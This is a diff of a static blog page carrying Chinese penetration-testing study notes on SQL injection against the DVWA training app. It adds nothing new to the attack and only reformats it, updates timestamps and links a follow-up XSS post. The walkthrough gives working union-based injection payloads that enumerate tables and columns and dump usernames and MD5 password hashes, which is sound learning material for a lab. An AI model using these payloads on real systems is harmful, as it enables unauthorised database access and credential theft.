@@ -90,7 +90,7 @@
 <meta property="og:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/tables_column_name.png">
 <meta property="og:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/users_table_content.png">
 <meta property="og:image" content="https://zebra233.github.io/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/username_password.png">
-<meta property="og:updated_time" content="2019-09-03T09:51:54.738Z">
+<meta property="og:updated_time" content="2019-09-04T11:58:33.611Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[渗透学习]7.Sql注入">
 <meta name="twitter:description" content="基本的Sql注入过程">
@@ -334,8 +334,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-03T17:51:54+08:00">
-                2019-09-03
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-04T19:58:33+08:00">
+                2019-09-04
               </time>
             
           </span>
@@ -382,22 +382,20 @@
 <a id="more"></a>
 <h1>Sql注入</h1>
 <p><em>先将DVWA的安全防护等级调为ｌｏｗ</em></p>
-<ol>
-<li>输入' or 1=1 -- '
-<img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/column_value.jpg" alt="列的数值">
-<em>'--'表示sql中的注释符</em></li>
-<li>输入' union select 1,2 -- '
-可知数据表有两列</li>
-<li>输入' union select 1, column_name from INFORMATION_SCHEMA.tables -- '
-查询INFORMATION_SCHEMA系统表
-<img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/tables_column_name.png" alt="表名表列"></li>
-<li>输入' union select 1, column_name from INFORMATION_SCHEMA.columns where table_name = 'users' -- '
-<img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/users_table_content.png" alt="users表中的内容"></li>
-<li>输入' union select null, password from users -- '
-得到密码的md5值</li>
-<li>输入' union select password, concat(first_name, ' ', last_name, ' ',user) from users -- '
-<img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/username_password.png" alt="用户名与口令"></li>
-</ol>
+<h2 id="1-输入-or-1-1">1. 输入' or 1=1 -- '</h2>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/column_value.jpg" alt="列的数值">
+<em>'--'表示sql中的注释符</em></p>
+<h2 id="2-输入-union-select-1-2">2. 输入' union select 1,2 -- '</h2>
+<p>可知数据表有两列</p>
+<h2 id="3-输入-union-select-1-column-name-from-information-schema-tables">3. 输入' union select 1, column_name from INFORMATION_SCHEMA.tables -- '</h2>
+<p>查询INFORMATION_SCHEMA系统表
+<img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/tables_column_name.png" alt="表名表列"></p>
+<h2 id="4-输入-union-select-1-column-name-from-information-schema-columns-where-table-name-users">4. 输入' union select 1, column_name from INFORMATION_SCHEMA.columns where table_name = 'users' -- '</h2>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/users_table_content.png" alt="users表中的内容"></p>
+<h2 id="5-输入-union-select-null-password-from-users">5. 输入' union select null, password from users -- '</h2>
+<p>得到密码的md5值</p>
+<h2 id="6-输入-union-select-password-concat-first-name-last-name-user-from-users">6. 输入' union select password, concat(first_name, ' ', last_name, ' ',user) from users -- '</h2>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-7-Sql%E6%B3%A8%E5%85%A5/username_password.png" alt="用户名与口令"></p>
 
       
     </div>
@@ -449,6 +447,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/04/透学习-8-XSS/" rel="prev" title="[渗透学习]8.XSS">
+                [渗透学习]8.XSS <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -535,7 +537,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -596,7 +598,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-text">Sql注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-text">Sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-输入-or-1-1"><span class="nav-text">1. 输入&#39; or 1=1 -- &#39;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-输入-union-select-1-2"><span class="nav-text">2. 输入&#39; union select 1,2 -- &#39;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-输入-union-select-1-column-name-from-information-schema-tables"><span class="nav-text">3. 输入&#39; union select 1, column_name from INFORMATION_SCHEMA.tables -- &#39;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-输入-union-select-1-column-name-from-information-schema-columns-where-table-name-users"><span class="nav-text">4. 输入&#39; union select 1, column_name from INFORMATION_SCHEMA.columns where table_name = &#39;users&#39; -- &#39;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-输入-union-select-null-password-from-users"><span class="nav-text">5. 输入&#39; union select null, password from users -- &#39;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-输入-union-select-password-concat-first-name-last-name-user-from-users"><span class="nav-text">6. 输入&#39; union select password, concat(first_name, &#39; &#39;, last_name, &#39; &#39;,user) from users -- &#39;</span></a></li></ol></li></ol></div>
             
 
           </div>
